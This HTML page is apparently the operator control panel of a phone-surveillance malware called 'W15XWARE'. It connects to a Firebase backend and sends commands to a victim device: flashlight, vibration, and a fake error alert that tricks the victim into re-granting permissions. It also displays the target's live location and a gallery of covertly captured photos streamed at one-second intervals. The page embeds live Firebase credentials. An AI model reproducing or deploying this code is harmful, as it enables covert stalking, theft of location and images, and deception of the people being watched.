<!DOCTYPE html>
<html>
<head>
    <title>W15XWARE - CONTROL CENTER</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="https://www.gstatic.com/firebasejs/9.1.3/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.1.3/firebase-database-compat.js"></script>
    <style>
        /* BACKGROUND & BASE */
        body { 
            background: url('https://i.ibb.co.com/gLSm2ChX/54c7a1a0-7809-4dfa-b3cb-7395e6edf8bd.png') no-repeat center center fixed; 
            background-size: cover;
            color: #00ff41; font-family: 'Courier New', monospace; 
            padding: 0; margin: 0; min-height: 100vh;
        }

        body::before {
            content: ""; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0, 0, 0, 0.7); z-index: 0;
        }

        .container { position: relative; z-index: 10; padding: 20px 15px 80px 15px; }

        /* NAVIGATION BAR */
        .navbar {
            position: fixed; bottom: 0; left: 0; width: 100%; height: 65px;
            background: rgba(5, 5, 5, 0.98); border-top: 2px solid #00ff41;
            display: flex; justify-content: space-around; align-items: center; z-index: 100;
        }

        .nav-item {
            color: #555; text-decoration: none; font-size: 0.75rem; font-weight: bold;
            display: flex; flex-direction: column; align-items: center; cursor: pointer; transition: 0.3s;
        }

        .nav-item.active { color: #00ff41; text-shadow: 0 0 10px #00ff41; }
        .nav-icon { font-size: 1.4rem; margin-bottom: 2px; }

        /* PAGES */
        .page { display: none; }
        .page.active { display: block; }

        /* PANEL UI */
        .panel { 
            border: 1px solid rgba(0, 255, 65, 0.3); padding: 15px; 
            margin-bottom: 15px; background: rgba(0, 0, 0, 0.85); 
            border-radius: 10px; box-shadow: 0 0 20px rgba(0, 0, 0, 0.8);
        }

        .btn { 
            background: #00ff41; color: #000; border: none; padding: 16px; 
            margin: 8px 0; cursor: pointer; font-weight: bold; width: 100%; 
            border-radius: 6px; text-transform: uppercase; font-size: 0.9rem;
        }

        .btn-red { background: #ff3333; color: #fff; }
        .btn-yellow { background: #fbff00; color: #000; }
        .btn-white { background: #ffffff; color: #000; }

        .info { 
            background: #0a0a0a; padding: 12px; border-radius: 5px; font-size: 0.85rem; 
            border-left: 4px solid #00ff41; color: #fff; margin-bottom: 10px;
        }

        /* GALLERY GRID */
        #gallery { 
            display: grid; grid-template-columns: repeat(2, 1fr); gap: 8px; 
        }
        #gallery img { 
            width: 100%; border: 1px solid #00ff41; border-radius: 4px; 
            background: #000; object-fit: cover; height: 200px;
        }

        h2 { text-align: center; font-size: 1.4rem; margin-bottom: 5px; letter-spacing: 4px; color: #fff; text-shadow: 0 0 10px #00ff41; }
        .sub-header { text-align: center; font-size: 0.6rem; color: #888; margin-bottom: 20px; text-transform: uppercase; }
        h3 { margin-top: 0; font-size: 0.85rem; border-bottom: 1px solid #222; padding-bottom: 8px; color: #00ff41; letter-spacing: 1px; }
    </style>
</head>
<body>

    <div class="container">
        
        <div id="page-home" class="page active">
            <h2>W15XWARE</h2>
            <div class="sub-header">BOSS MODE : SKY ACCESS ONLY</div>
            
            <div class="panel">
                <h3>EXECUTION COMMANDS</h3>
                <button class="btn" onclick="sendCmd('flashlight', 'on')">FLASH ON</button>
                <button class="btn btn-red" onclick="sendCmd('flashlight', 'off')">FLASH OFF</button>
                <button class="btn btn-yellow" onclick="sendCmd('vibrate', 'start')">VIBRATE HP</button> 
                <button class="btn btn-white" onclick="sendCmd('alert', 'Koneksi Error: Mohon Tekan Izinkan Ulang')">FAKE ALERT</button>
            </div>

            <div class="panel">
                <h3>GEOLOCATION</h3>
                <div id="loc-info" class="info">Searching signal...</div>
                <button class="btn" style="background:#4285F4; color:#fff;" onclick="openMap()">VIEW IN MAPS</button>
            </div>
        </div>

        <div id="page-gallery" class="page">
            <h2>W15XWARE : CAPTURES</h2>
            <div class="sub-header">INTERVAL: 1S | REALTIME STREAM</div>
            <div class="panel">
                <div id="gallery"></div>
            </div>
        </div>

    </div>

    <div class="navbar">
        <div class="nav-item active" id="nav-home" onclick="showPage('home')">
            <span class="nav-icon">🛡️</span>
            <span>CONTROL</span>
        </div>
        <div class="nav-item" id="nav-gallery" onclick="showPage('gallery')">
            <span class="nav-icon">👁️</span>
            <span>GALLERY</span>
        </div>
    </div>

    <script>
        const firebaseConfig = {
            apiKey: "AIzaSyChPl3LbS1nk1dRp6E4copCkJowWkGRVI4",
            authDomain: "zenith-one-98d1f.firebaseapp.com",
            databaseURL: "https://zenith-one-98d1f-default-rtdb.asia-southeast1.firebasedatabase.app",
            projectId: "zenith-one-98d1f",
            storageBucket: "zenith-one-98d1f.firebasestorage.app",
            messagingSenderId: "806361386999",
            appId: "1:806361386999:web:fea4f8230f4db644efe8f2"
        };
        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();

        let lastLat, lastLon;

        // NAVIGASI
        function showPage(pageId) {
            document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
            document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
            document.getElementById('page-' + pageId).classList.add('active');
            document.getElementById('nav-' + pageId).classList.add('active');
        }

        // LOGIC
        function sendCmd(type, val) {
            db.ref('commands').set({ type: type, value: val, time: Date.now() });
        }

        db.ref('target/location').on('value', snap => {
            const data = snap.val();
            if(data) {
                lastLat = data.lat; lastLon = data.lon;
                document.getElementById('loc-info').innerText = `LAT: ${data.lat}\nLON: ${data.lon}\nTIME: ${new Date(data.time).toLocaleTimeString()}`;
            }
        });

        // Gallery Realtime
        db.ref('target/photos').limitToLast(50).on('child_added', snap => {
            const data = snap.val();
            const img = document.createElement('img');
            img.src = data.url; 
            document.getElementById('gallery').prepend(img);
        });

        function openMap() {
            if(lastLat) window.open(`https://www.google.com/maps?q=${lastLat},${lastLon}`);
        }
    </script>
</body>
</html>
